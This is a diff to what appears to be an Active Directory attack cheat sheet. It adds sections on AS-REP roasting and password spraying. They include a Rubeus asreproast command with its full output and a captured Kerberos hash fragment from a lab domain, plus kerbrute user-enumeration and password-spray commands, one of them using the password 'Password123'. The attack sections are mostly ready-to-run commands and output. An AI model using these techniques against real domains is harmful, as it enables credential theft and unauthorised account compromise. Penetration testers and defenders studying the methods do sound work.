@@ -13,6 +13,7 @@
   * [Silver Tickets](#passtheticket-silver-tickets)
   * [Trust Tickets](#trust-tickets)
   * [Kerberoast](#kerberoast)
+  * [KRB_AS_REP roasting](#krb_as_rep-roasting)
   * [Pass-the-Hash](#pass-the-hash)
   * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
   * [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
@@ -20,6 +21,7 @@
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
   * [PrivExchange attack](#privexchange-attack)
+  * [Password spraying](#password-spraying)
 * [Privilege Escalation](#privilege-escalation)
   * [PrivEsc Local Admin - Token Impersonation (RottenPotato)](#privesc-local-admin---token-impersonation-rottenpotato)
   * [PrivEsc Local Admin - MS16-032](#privesc-local-admin---ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
@@ -72,6 +74,12 @@
 
     ```powershell
     pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
+    ```
+
+* [Kerbrute](https://github.com/ropnop/kerbrute)
+
+    ```powershell
+    ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
     ```
 
 ## Most common paths to AD compromise
@@ -380,6 +388,42 @@ hashcat -m 13100 -a 0 hash.txt crackstation.txt
 ./john ~/hash.txt --wordlist=rockyou.lst
 ```
 
+### KRB_AS_REP Roasting
+
+If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
+
+```powershell
+C:\>git clone https://github.com/GhostPack/Rubeus#asreproast
+C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : TestOU3user
+[*] Target Domain          : testlab.local
+
+[*] SamAccountName         : TestOU3user
+[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+[*] Using domain controller: testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 169 bytes
+[*] Received 1437 bytes
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+    $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
+```
+
 ### Pass-the-Hash
 
 The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes.
@@ -497,6 +541,16 @@ You need a shell on a user account with a mailbox.
 Alternatively you can use the Metasploit module 
 
 [`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)
+
+### Password spraying
+
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+
+```powershell
+root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+```
+
 
 ## Privilege Escalation
 
